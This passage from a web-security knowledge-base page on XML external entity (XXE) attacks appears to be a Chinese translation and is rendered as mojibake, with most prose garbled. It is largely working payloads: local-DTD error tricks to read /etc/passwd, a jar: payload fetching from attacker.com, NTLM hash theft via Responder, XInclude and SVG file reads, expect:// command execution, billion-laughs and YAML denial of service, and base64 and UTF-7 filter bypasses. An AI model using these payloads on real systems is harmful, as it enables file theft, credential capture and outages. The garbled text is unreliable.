<p>è€ƒè™‘ä¸€ä¸ªåœºæ™¯ï¼ŒæœåŠ¡å™¨çš„æ–‡ä»¶ç³»ç»Ÿä¸­åŒ…å«ä¸€ä¸ªä½äº <code>/usr/local/app/schema.dtd</code> çš„ DTD æ–‡ä»¶ï¼Œå®šä¹‰äº†ä¸€ä¸ªåä¸º <code>custom_entity</code> çš„å®ä½“ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æäº¤ä¸€ä¸ªæ··åˆ DTD æ¥è¯±å‘ XML è§£æé”™è¯¯ï¼Œä»è€Œæ­ç¤º <code>/etc/passwd</code> æ–‡ä»¶çš„å†…å®¹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="language-xml">&lt;!DOCTYPE foo [
&lt;!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"&gt;
&lt;!ENTITY % custom_entity '
&lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file&amp;#x27;&gt;"&gt;
&amp;#x25;eval;
&amp;#x25;error;
'&gt;
%local_dtd;
]&gt;
</code></pre>
<p>The outlined steps are executed by this DTD:</p>
<ul>
<li>XMLå‚æ•°å®ä½“<code>local_dtd</code>çš„å®šä¹‰åŒ…æ‹¬ä½äºæœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿä¸Šçš„å¤–éƒ¨DTDæ–‡ä»¶ã€‚</li>
<li>å¯¹<code>custom_entity</code> XMLå‚æ•°å®ä½“è¿›è¡Œé‡æ–°å®šä¹‰ï¼Œè¯¥å®ä½“æœ€åˆåœ¨å¤–éƒ¨DTDä¸­å®šä¹‰ï¼Œä»¥å°è£…ä¸€ä¸ª<a href="https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages">åŸºäºé”™è¯¯çš„XXEæ¼æ´</a>ã€‚æ­¤é‡æ–°å®šä¹‰æ—¨åœ¨å¼•å‘è§£æé”™è¯¯ï¼Œæš´éœ²<code>/etc/passwd</code>æ–‡ä»¶çš„å†…å®¹ã€‚</li>
<li>é€šè¿‡ä½¿ç”¨<code>local_dtd</code>å®ä½“ï¼Œå¤–éƒ¨DTDè¢«è°ƒç”¨ï¼ŒåŒ…å«æ–°å®šä¹‰çš„<code>custom_entity</code>ã€‚è¿™ä¸€ç³»åˆ—æ“ä½œå¯¼è‡´äº†æ¼æ´æ‰€é’ˆå¯¹çš„é”™è¯¯æ¶ˆæ¯çš„å‘å‡ºã€‚</li>
</ul>
<p><strong>Real world example:</strong> ä½¿ç”¨GNOMEæ¡Œé¢ç¯å¢ƒçš„ç³»ç»Ÿé€šå¸¸åœ¨<code>/usr/share/yelp/dtd/docbookx.dtd</code>ä¸­æœ‰ä¸€ä¸ªDTDï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªåä¸º<code>ISOamso</code>çš„å®ä½“ã€‚</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [
&lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;
&lt;!ENTITY % ISOamso '
&lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;
&amp;#x25;eval;
&amp;#x25;error;
'&gt;
%local_dtd;
]&gt;
&lt;stockCheck&gt;&lt;productId&gt;3;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;
</code></pre>
<p><img src="../.gitbook/assets/image%20(625).png" alt="" /></p>
<p>ç”±äºæ­¤æŠ€æœ¯ä½¿ç”¨<strong>å†…éƒ¨ DTDï¼Œæ‚¨éœ€è¦å…ˆæ‰¾åˆ°ä¸€ä¸ªæœ‰æ•ˆçš„ DTD</strong>ã€‚æ‚¨å¯ä»¥é€šè¿‡<strong>å®‰è£…</strong>æœåŠ¡å™¨æ­£åœ¨ä½¿ç”¨çš„ç›¸åŒ<strong>æ“ä½œç³»ç»Ÿ/è½¯ä»¶</strong>å¹¶<strong>æœç´¢ä¸€äº›é»˜è®¤ DTD</strong>ï¼Œæˆ–è€…<strong>è·å–ç³»ç»Ÿå†…çš„é»˜è®¤ DTD åˆ—è¡¨</strong>å¹¶<strong>æ£€æŸ¥</strong>å®ƒä»¬æ˜¯å¦å­˜åœ¨ï¼š</p>
<pre><code class="language-xml">&lt;!DOCTYPE foo [
&lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;
%local_dtd;
]&gt;
</code></pre>
<p>æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ <a href="https://portswigger.net/web-security/xxe/blind">https://portswigger.net/web-security/xxe/blind</a></p>
<h3 id="åœ¨ç³»ç»Ÿä¸­æŸ¥æ‰¾-dtd"><a class="header" href="#åœ¨ç³»ç»Ÿä¸­æŸ¥æ‰¾-dtd">åœ¨ç³»ç»Ÿä¸­æŸ¥æ‰¾ DTD</a></h3>
<p>åœ¨ä»¥ä¸‹ç²¾å½©çš„ GitHub ä»“åº“ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ° <strong>å¯èƒ½å­˜åœ¨äºç³»ç»Ÿä¸­çš„ DTD è·¯å¾„</strong>ï¼š</p>
<p>{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}</p>
<p>æ­¤å¤–ï¼Œå¦‚æœæ‚¨æ‹¥æœ‰ <strong>å—å®³è€…ç³»ç»Ÿçš„ Docker é•œåƒ</strong>ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨åŒä¸€ä»“åº“çš„å·¥å…·æ¥ <strong>æ‰«æ</strong> <strong>é•œåƒ</strong> å¹¶ <strong>æŸ¥æ‰¾</strong> ç³»ç»Ÿä¸­å­˜åœ¨çš„ <strong>DTD è·¯å¾„</strong>ã€‚è¯·é˜…è¯» <a href="https://github.com/GoSecure/dtd-finder">GitHub çš„è‡ªè¿°æ–‡ä»¶</a> ä»¥äº†è§£å¦‚ä½•æ“ä½œã€‚</p>
<pre><code class="language-bash">java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
</code></pre>
<h3 id="xxe-via-office-open-xml-parsers"><a class="header" href="#xxe-via-office-open-xml-parsers">XXE via Office Open XML Parsers</a></h3>
<p>è¦æ›´æ·±å…¥åœ°äº†è§£æ­¤æ”»å‡»ï¼Œ<strong>è¯·æŸ¥çœ‹</strong> <a href="https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/"><strong>è¿™ç¯‡ç²¾å½©çš„æ–‡ç« </strong></a> <strong>æ¥è‡ª Detectify çš„ç¬¬äºŒéƒ¨åˆ†</strong>ã€‚</p>
<p>è®¸å¤šç½‘ç»œåº”ç”¨ç¨‹åºæä¾›<strong>ä¸Šä¼  Microsoft Office æ–‡æ¡£çš„åŠŸèƒ½</strong>ï¼Œç„¶åæå–è¿™äº›æ–‡æ¡£ä¸­çš„æŸäº›ç»†èŠ‚ã€‚ä¾‹å¦‚ï¼Œç½‘ç»œåº”ç”¨ç¨‹åºå¯èƒ½å…è®¸ç”¨æˆ·é€šè¿‡ä¸Šä¼  XLSX æ ¼å¼çš„ç”µå­è¡¨æ ¼æ¥å¯¼å…¥æ•°æ®ã€‚ä¸ºäº†è®©è§£æå™¨ä»ç”µå­è¡¨æ ¼ä¸­æå–æ•°æ®ï¼Œå®ƒä¸å¯é¿å…åœ°éœ€è¦è§£æè‡³å°‘ä¸€ä¸ª XML æ–‡ä»¶ã€‚</p>
<p>è¦æµ‹è¯•æ­¤æ¼æ´ï¼Œéœ€è¦åˆ›å»ºä¸€ä¸ª<strong>åŒ…å« XXE æœ‰æ•ˆè´Ÿè½½çš„ Microsoft Office æ–‡ä»¶</strong>ã€‚ç¬¬ä¸€æ­¥æ˜¯åˆ›å»ºä¸€ä¸ªç©ºç›®å½•ï¼Œä»¥ä¾¿å°†æ–‡æ¡£è§£å‹ç¼©åˆ°å…¶ä¸­ã€‚</p>
<p>æ–‡æ¡£è§£å‹ç¼©åï¼Œåº”åœ¨é¦–é€‰æ–‡æœ¬ç¼–è¾‘å™¨ï¼ˆå¦‚ vimï¼‰ä¸­æ‰“å¼€å¹¶ç¼–è¾‘ä½äº <code>./unzipped/word/document.xml</code> çš„ XML æ–‡ä»¶ã€‚åº”ä¿®æ”¹ XML ä»¥åŒ…å«æ‰€éœ€çš„ XXE æœ‰æ•ˆè´Ÿè½½ï¼Œé€šå¸¸ä»¥ HTTP è¯·æ±‚å¼€å¤´ã€‚</p>
<p>ä¿®æ”¹åçš„ XML è¡Œåº”æ’å…¥åˆ°ä¸¤ä¸ªæ ¹ XML å¯¹è±¡ä¹‹é—´ã€‚é‡è¦çš„æ˜¯å°† URL æ›¿æ¢ä¸ºå¯ç›‘æ§è¯·æ±‚çš„ URLã€‚</p>
<p>æœ€åï¼Œå¯ä»¥å°†æ–‡ä»¶å‹ç¼©ä»¥åˆ›å»ºæ¶æ„çš„ poc.docx æ–‡ä»¶ã€‚ä»ä¹‹å‰åˆ›å»ºçš„â€œunzippedâ€ç›®å½•ä¸­ï¼Œåº”è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p>
<p>ç°åœ¨ï¼Œå¯ä»¥å°†åˆ›å»ºçš„æ–‡ä»¶ä¸Šä¼ åˆ°æ½œåœ¨çš„æ˜“å—æ”»å‡»çš„ç½‘ç»œåº”ç”¨ç¨‹åºï¼Œå¹¶å¸Œæœ›åœ¨ Burp Collaborator æ—¥å¿—ä¸­å‡ºç°è¯·æ±‚ã€‚</p>
<h3 id="jar-protocol"><a class="header" href="#jar-protocol">Jar: protocol</a></h3>
<p><strong>jar</strong> åè®®ä»…åœ¨ <strong>Java åº”ç”¨ç¨‹åº</strong> ä¸­å¯ç”¨ã€‚å®ƒæ—¨åœ¨å¯ç”¨å¯¹ <strong>PKZIP</strong> å­˜æ¡£ï¼ˆä¾‹å¦‚ï¼Œ<code>.zip</code>ã€<code>.jar</code> ç­‰ï¼‰ä¸­çš„æ–‡ä»¶è®¿é—®ï¼Œé€‚ç”¨äºæœ¬åœ°å’Œè¿œç¨‹æ–‡ä»¶ã€‚</p>
<pre><code>jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
</code></pre>
<p>{% hint style="danger" %}
èƒ½å¤Ÿè®¿é—®PKZIPæ–‡ä»¶ä¸­çš„æ–‡ä»¶å¯¹<strong>åˆ©ç”¨ç³»ç»ŸDTDæ–‡ä»¶è¿›è¡ŒXXEæ”»å‡»éå¸¸æœ‰ç”¨ã€‚</strong> æŸ¥çœ‹<a href="xxe-xee-xml-external-entity.html#error-based-system-dtd">æœ¬èŠ‚ä»¥äº†è§£å¦‚ä½•åˆ©ç”¨ç³»ç»ŸDTDæ–‡ä»¶</a>ã€‚
{% endhint %}</p>
<p>é€šè¿‡jaråè®®è®¿é—®PKZIPå½’æ¡£æ–‡ä»¶ä¸­çš„æ–‡ä»¶çš„è¿‡ç¨‹æ¶‰åŠå‡ ä¸ªæ­¥éª¤ï¼š</p>
<ol>
<li>å‘å‡ºHTTPè¯·æ±‚ï¼Œä»æŒ‡å®šä½ç½®ä¸‹è½½zipå½’æ¡£ï¼Œä¾‹å¦‚<code>https://download.website.com/archive.zip</code>ã€‚</li>
<li>åŒ…å«å½’æ¡£çš„HTTPå“åº”ä¸´æ—¶å­˜å‚¨åœ¨ç³»ç»Ÿä¸Šï¼Œé€šå¸¸åœ¨<code>/tmp/...</code>è¿™æ ·çš„åœ°æ–¹ã€‚</li>
<li>ç„¶åæå–å½’æ¡£ä»¥è®¿é—®å…¶å†…å®¹ã€‚</li>
<li>è¯»å–å½’æ¡£ä¸­çš„ç‰¹å®šæ–‡ä»¶<code>file.zip</code>ã€‚</li>
<li>æ“ä½œå®Œæˆåï¼Œåˆ é™¤åœ¨æ­¤è¿‡ç¨‹ä¸­åˆ›å»ºçš„ä»»ä½•ä¸´æ—¶æ–‡ä»¶ã€‚</li>
</ol>
<p>åœ¨ç¬¬äºŒæ­¥ä¸­ä¸­æ–­æ­¤è¿‡ç¨‹çš„ä¸€ä¸ªæœ‰è¶£æŠ€æœ¯æ˜¯ï¼Œåœ¨æä¾›å½’æ¡£æ–‡ä»¶æ—¶ä¿æŒæœåŠ¡å™¨è¿æ¥æ— é™æœŸæ‰“å¼€ã€‚å¯ä»¥åˆ©ç”¨<a href="https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution">è¿™ä¸ªä»“åº“</a>ä¸­çš„å·¥å…·æ¥å®ç°è¿™ä¸€ç‚¹ï¼ŒåŒ…æ‹¬ä¸€ä¸ªPythonæœåŠ¡å™¨(<code>slow_http_server.py</code>)å’Œä¸€ä¸ªJavaæœåŠ¡å™¨(<code>slowserver.jar</code>)ã€‚</p>
<pre><code class="language-xml">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd"&gt;]&gt;
&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
</code></pre>
<p>{% hint style="danger" %}
åœ¨ä¸´æ—¶ç›®å½•ä¸­å†™å…¥æ–‡ä»¶å¯ä»¥å¸®åŠ©<strong>å‡çº§å¦ä¸€ä¸ªæ¶‰åŠè·¯å¾„éå†çš„æ¼æ´</strong>ï¼ˆä¾‹å¦‚æœ¬åœ°æ–‡ä»¶åŒ…å«ã€æ¨¡æ¿æ³¨å…¥ã€XSLT RCEã€ååºåˆ—åŒ–ç­‰ï¼‰ã€‚
{% endhint %}</p>
<h3 id="xss"><a class="header" href="#xss">XSS</a></h3>
<pre><code class="language-xml">&lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert(1)&lt;![CDATA[&lt;]]&gt;/script&lt;![CDATA[&gt;]]&gt;
</code></pre>
<h3 id="dos"><a class="header" href="#dos">DoS</a></h3>
<h4 id="åäº¿ç¬‘å£°æ”»å‡»"><a class="header" href="#åäº¿ç¬‘å£°æ”»å‡»">åäº¿ç¬‘å£°æ”»å‡»</a></h4>
<pre><code class="language-xml">&lt;!DOCTYPE data [
&lt;!ENTITY a0 "dos" &gt;
&lt;!ENTITY a1 "&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;"&gt;
&lt;!ENTITY a2 "&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;"&gt;
&lt;!ENTITY a3 "&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;"&gt;
&lt;!ENTITY a4 "&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;"&gt;
]&gt;
&lt;data&gt;&amp;a4;&lt;/data&gt;
</code></pre>
<h4 id="yaml-æ”»å‡»"><a class="header" href="#yaml-æ”»å‡»">Yaml æ”»å‡»</a></h4>
<pre><code class="language-xml">a: &amp;a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &amp;b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &amp;c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &amp;d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &amp;e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &amp;f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &amp;g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &amp;h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &amp;i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
</code></pre>
<h4 id="äºŒæ¬¡çˆ†ç‚¸æ”»å‡»"><a class="header" href="#äºŒæ¬¡çˆ†ç‚¸æ”»å‡»">äºŒæ¬¡çˆ†ç‚¸æ”»å‡»</a></h4>
<p><img src="../.gitbook/assets/image%20(527).png" alt="" /></p>
<h4 id="è·å–-ntml"><a class="header" href="#è·å–-ntml">è·å– NTML</a></h4>
<p>åœ¨ Windows ä¸»æœºä¸Šï¼Œå¯ä»¥é€šè¿‡è®¾ç½® responder.py å¤„ç†ç¨‹åºæ¥è·å– web æœåŠ¡å™¨ç”¨æˆ·çš„ NTML å“ˆå¸Œï¼š</p>
<pre><code class="language-bash">Responder.py -I eth0 -v
</code></pre>
<p>å¹¶é€šè¿‡å‘é€ä»¥ä¸‹è¯·æ±‚</p>
<pre><code class="language-xml">&lt;!--?xml version="1.0" ?--&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'&gt; ]&gt;
&lt;data&gt;&amp;example;&lt;/data&gt;
</code></pre>
<p>ç„¶åä½ å¯ä»¥å°è¯•ä½¿ç”¨ hashcat ç ´è§£å“ˆå¸Œ</p>
<h2 id="éšè—çš„-xxe-è¡¨ç°"><a class="header" href="#éšè—çš„-xxe-è¡¨ç°">éšè—çš„ XXE è¡¨ç°</a></h2>
<h3 id="xinclude"><a class="header" href="#xinclude">XInclude</a></h3>
<p>åœ¨å°†å®¢æˆ·ç«¯æ•°æ®é›†æˆåˆ°æœåŠ¡å™¨ç«¯ XML æ–‡æ¡£ä¸­æ—¶ï¼Œä¾‹å¦‚åç«¯ SOAP è¯·æ±‚ä¸­çš„æ–‡æ¡£ï¼Œé€šå¸¸å¯¹ XML ç»“æ„çš„ç›´æ¥æ§åˆ¶æ˜¯æœ‰é™çš„ï¼Œè¿™ä½¿å¾—ç”±äºå¯¹ä¿®æ”¹ <code>DOCTYPE</code> å…ƒç´ çš„é™åˆ¶ï¼Œä¼ ç»Ÿçš„ XXE æ”»å‡»å—åˆ°é˜»ç¢ã€‚ç„¶è€Œï¼Œ<code>XInclude</code> æ”»å‡»æä¾›äº†è§£å†³æ–¹æ¡ˆï¼Œé€šè¿‡å…è®¸åœ¨ XML æ–‡æ¡£çš„ä»»ä½•æ•°æ®å…ƒç´ ä¸­æ’å…¥å¤–éƒ¨å®ä½“ã€‚å³ä½¿åªèƒ½æ§åˆ¶æœåŠ¡å™¨ç”Ÿæˆçš„ XML æ–‡æ¡£ä¸­çš„ä¸€éƒ¨åˆ†æ•°æ®ï¼Œè¿™ç§æ–¹æ³•ä¹Ÿæ˜¯æœ‰æ•ˆçš„ã€‚</p>
<p>è¦æ‰§è¡Œ <code>XInclude</code> æ”»å‡»ï¼Œå¿…é¡»å£°æ˜ <code>XInclude</code> å‘½åç©ºé—´ï¼Œå¹¶æŒ‡å®šæ‰€éœ€å¤–éƒ¨å®ä½“çš„æ–‡ä»¶è·¯å¾„ã€‚ä»¥ä¸‹æ˜¯å¦‚ä½•åˆ¶å®šæ­¤ç±»æ”»å‡»çš„ç®€æ´ç¤ºä¾‹ï¼š</p>
<pre><code class="language-xml">productId=&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;&lt;xi:include parse="text" href="file:///etc/passwd"/&gt;&lt;/foo&gt;&amp;storeId=1
</code></pre>
<p>æ£€æŸ¥ <a href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a> ä»¥è·å–æ›´å¤šä¿¡æ¯ï¼</p>
<h3 id="svg---æ–‡ä»¶ä¸Šä¼ "><a class="header" href="#svg---æ–‡ä»¶ä¸Šä¼ ">SVG - æ–‡ä»¶ä¸Šä¼ </a></h3>
<p>ç”¨æˆ·ä¸Šä¼ åˆ°æŸäº›åº”ç”¨ç¨‹åºçš„æ–‡ä»¶ï¼Œåœ¨æœåŠ¡å™¨ä¸Šå¤„ç†æ—¶ï¼Œå¯èƒ½ä¼šåˆ©ç”¨ XML æˆ–åŒ…å« XML çš„æ–‡ä»¶æ ¼å¼å¤„ç†ä¸­çš„æ¼æ´ã€‚å¸¸è§çš„æ–‡ä»¶æ ¼å¼å¦‚åŠå…¬æ–‡æ¡£ (DOCX) å’Œå›¾åƒ (SVG) åŸºäº XMLã€‚</p>
<p>å½“ç”¨æˆ· <strong>ä¸Šä¼ å›¾åƒ</strong> æ—¶ï¼Œè¿™äº›å›¾åƒä¼šåœ¨æœåŠ¡å™¨ç«¯è¿›è¡Œå¤„ç†æˆ–éªŒè¯ã€‚å³ä½¿å¯¹äºæœŸæœ› PNG æˆ– JPEG æ ¼å¼çš„åº”ç”¨ç¨‹åºï¼Œ<strong>æœåŠ¡å™¨çš„å›¾åƒå¤„ç†åº“ä¹Ÿå¯èƒ½æ”¯æŒ SVG å›¾åƒ</strong>ã€‚ç”±äº SVG æ˜¯åŸºäº XML çš„æ ¼å¼ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æäº¤æ¶æ„ SVG å›¾åƒï¼Œä»è€Œä½¿æœåŠ¡å™¨æš´éœ²äº XXEï¼ˆXML å¤–éƒ¨å®ä½“ï¼‰æ¼æ´ã€‚</p>
<p>ä¸‹é¢å±•ç¤ºäº†ä¸€ä¸ªæ­¤ç±»æ”»å‡»çš„ç¤ºä¾‹ï¼Œå…¶ä¸­æ¶æ„ SVG å›¾åƒè¯•å›¾è¯»å–ç³»ç»Ÿæ–‡ä»¶ï¼š</p>
<pre><code class="language-xml">&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"&gt;&lt;image xlink:href="file:///etc/hostname"&gt;&lt;/image&gt;&lt;/svg&gt;
</code></pre>
<p>å¦ä¸€ç§æ–¹æ³•æ¶‰åŠå°è¯•é€šè¿‡ PHP "expect" åŒ…è£…å™¨ <strong>æ‰§è¡Œå‘½ä»¤</strong>ï¼š</p>
<pre><code class="language-xml">&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"&gt;
&lt;image xlink:href="expect://ls"&gt;&lt;/image&gt;
&lt;/svg&gt;
</code></pre>
<p>åœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼ŒSVG æ ¼å¼è¢«ç”¨æ¥å‘èµ·æ”»å‡»ï¼Œåˆ©ç”¨æœåŠ¡å™¨è½¯ä»¶çš„ XML å¤„ç†èƒ½åŠ›ï¼Œçªæ˜¾äº†å¼ºå¤§è¾“å…¥éªŒè¯å’Œå®‰å…¨æªæ–½çš„å¿…è¦æ€§ã€‚</p>
<p>æŸ¥çœ‹ <a href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a> è·å–æ›´å¤šä¿¡æ¯ï¼</p>
<p><strong>æ³¨æ„ï¼Œè¯»å–æ–‡ä»¶çš„ç¬¬ä¸€è¡Œæˆ–æ‰§è¡Œç»“æœå°†å‡ºç°åœ¨åˆ›å»ºçš„å›¾åƒå†…éƒ¨ã€‚å› æ­¤ï¼Œæ‚¨éœ€è¦èƒ½å¤Ÿè®¿é—® SVG åˆ›å»ºçš„å›¾åƒã€‚</strong></p>
<h3 id="pdf---æ–‡ä»¶ä¸Šä¼ "><a class="header" href="#pdf---æ–‡ä»¶ä¸Šä¼ "><strong>PDF - æ–‡ä»¶ä¸Šä¼ </strong></a></h3>
<p>é˜…è¯»ä»¥ä¸‹å¸–å­ä»¥<strong>äº†è§£å¦‚ä½•åˆ©ç”¨ XXE ä¸Šä¼  PDF</strong> æ–‡ä»¶ï¼š</p>
<p>{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
<a href="file-upload/pdf-upload-xxe-and-cors-bypass.html">pdf-upload-xxe-and-cors-bypass.md</a>
{% endcontent-ref %}</p>
<h3 id="content-type-ä»-x-www-urlencoded-åˆ°-xml"><a class="header" href="#content-type-ä»-x-www-urlencoded-åˆ°-xml">Content-Type: ä» x-www-urlencoded åˆ° XML</a></h3>
<p>å¦‚æœ POST è¯·æ±‚æ¥å— XML æ ¼å¼çš„æ•°æ®ï¼Œæ‚¨å¯ä»¥å°è¯•åœ¨è¯¥è¯·æ±‚ä¸­åˆ©ç”¨ XXEã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ­£å¸¸è¯·æ±‚åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š</p>
<pre><code class="language-xml">POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
</code></pre>
<p>ç„¶åæ‚¨å¯èƒ½èƒ½å¤Ÿæäº¤ä»¥ä¸‹è¯·æ±‚ï¼Œç»“æœç›¸åŒï¼š</p>
<pre><code class="language-xml">POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;foo&gt;bar&lt;/foo&gt;
</code></pre>
<h3 id="content-type-ä»-json-åˆ°-xee"><a class="header" href="#content-type-ä»-json-åˆ°-xee">Content-Type: ä» JSON åˆ° XEE</a></h3>
<p>è¦æ›´æ”¹è¯·æ±‚ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä¸€ä¸ªåä¸ºâ€œ<strong>Content Type Converter</strong>â€çš„ Burp æ‰©å±•ã€‚ <a href="https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html">è¿™é‡Œ</a> æ‚¨å¯ä»¥æ‰¾åˆ°è¿™ä¸ªä¾‹å­ï¼š</p>
<pre><code class="language-xml">Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
</code></pre>
<pre><code class="language-xml">Content-Type: application/xml;charset=UTF-8

&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;
&lt;!DOCTYPE testingxxe [&lt;!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" &gt;]&gt;
&lt;root&gt;
&lt;root&gt;
&lt;firstName&gt;&amp;xxe;&lt;/firstName&gt;
&lt;lastName/&gt;
&lt;country&gt;United States&lt;/country&gt;
&lt;city&gt;ddd&lt;/city&gt;
&lt;postalCode&gt;ddd&lt;/postalCode&gt;
&lt;/root&gt;
&lt;/root&gt;
</code></pre>
<p>å¦ä¸€ä¸ªä¾‹å­å¯ä»¥åœ¨ <a href="https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2">è¿™é‡Œ</a> æ‰¾åˆ°ã€‚</p>
<h2 id="waf-å’Œä¿æŠ¤ç»•è¿‡"><a class="header" href="#waf-å’Œä¿æŠ¤ç»•è¿‡">WAF å’Œä¿æŠ¤ç»•è¿‡</a></h2>
<h3 id="base64"><a class="header" href="#base64">Base64</a></h3>
<pre><code class="language-xml">&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"&gt; %init; ]&gt;&lt;foo/&gt;
</code></pre>
<p>è¿™ä»…åœ¨ XML æœåŠ¡å™¨æ¥å— <code>data://</code> åè®®æ—¶æœ‰æ•ˆã€‚</p>
<h3 id="utf-7"><a class="header" href="#utf-7">UTF-7</a></h3>
<p>æ‚¨å¯ä»¥åœ¨æ­¤å¤„ä½¿ç”¨ [<strong>"Encode Recipe</strong>" of cyberchef ]([<a href="https://gchq.github.io/CyberChef/#recipe=Encode_text%28&#x27;UTF-7">https://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-7</a> %2865000%29'%29&amp;input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to](<a href="https://gchq.github.io/CyberChef/#recipe=Encode_text%28%27UTF-7%20%2865000%29%27%29&amp;input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to">https://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-7 %2865000%29'%29&amp;input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to</a>) è½¬æ¢ä¸º UTF-7ã€‚</p>
<pre><code class="language-xml">&lt;!xml version="1.0" encoding="UTF-7"?--&gt;
